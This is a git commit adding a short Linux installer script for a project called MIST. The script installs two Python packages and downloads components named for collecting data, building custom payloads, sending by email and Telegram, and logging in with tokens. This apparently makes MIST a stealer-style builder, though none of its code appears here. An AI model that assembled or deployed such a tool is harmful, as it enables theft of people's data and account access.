b49ce99a233cc03c89dc0136e37454fd41e9dbc9
gh0stKn1ght <174645041+gh0stKn1ght@users.noreply.github.com>
2024-09-12 14:44:29 +0300

    Added Linux installer

---
+++ installer.sh
@@ -0,0 +1,13 @@
+pip install pyfiglet
+pip install cryptography
+mkdir ./MIST
+curl https://raw.githubusercontent.com/gh0stKn1ght/MIST/main/src/MIST_collect > ./MIST/MIST_collect
+curl https://raw.githubusercontent.com/gh0stKn1ght/MIST/main/src/MIST_custom_payload > ./MIST/MIST_custom_payload
+curl https://raw.githubusercontent.com/gh0stKn1ght/MIST/main/src/MIST_email > ./MIST/MIST_email
+curl https://raw.githubusercontent.com/gh0stKn1ght/MIST/main/src/MIST_encryption > ./MIST/MIST_encryption
+curl https://raw.githubusercontent.com/gh0stKn1ght/MIST/main/src/MIST_telegram > ./MIST/MIST_telegram
+curl https://raw.githubusercontent.com/gh0stKn1ght/MIST/main/src/build.py > ./MIST/build.py
+curl https://raw.githubusercontent.com/gh0stKn1ght/MIST/main/src/decrypt.py > ./MIST/decrypt.py
+curl https://raw.githubusercontent.com/gh0stKn1ght/MIST/main/src/launcher.py > ./MIST/launcher.py
+curl https://raw.githubusercontent.com/gh0stKn1ght/MIST/main/src/login_with_token > ./MIST/login_with_token
+echo Successfully installed MIST!
